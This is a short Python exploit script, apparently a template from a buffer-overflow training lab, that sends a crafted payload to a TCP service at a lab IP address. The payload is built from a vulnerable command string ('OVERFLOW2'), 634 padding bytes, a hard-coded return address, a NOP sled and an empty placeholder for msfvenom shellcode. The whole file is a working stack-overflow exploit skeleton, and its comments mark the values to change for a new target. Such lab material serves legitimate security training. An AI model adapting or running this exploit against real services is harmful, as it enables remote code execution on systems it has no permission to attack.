#!/usr/bin/env python3
import sys, socket

overflow = (
"")
 # This is where the output from msfvenom should go

returnaddress = "\xbb\x11\x50\x62" #CHANGE THIS
address = '10.10.211.46' #CHANGE THIS
port = 1337 #CHANGE THIS
vulncommand = "OVERFLOW2 " # CHANGE THIS, the vulnerable command that was found in the spiking section would go here
shell = "A" * 634


shellcode = vulncommand + shell + returnaddress + "\x90" * 16 + overflow

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((address,port))

        s.send(bytes(shellcode, "latin-1"))
        s.close()

except:
        print("Error connecting to server")
        sys.exit()
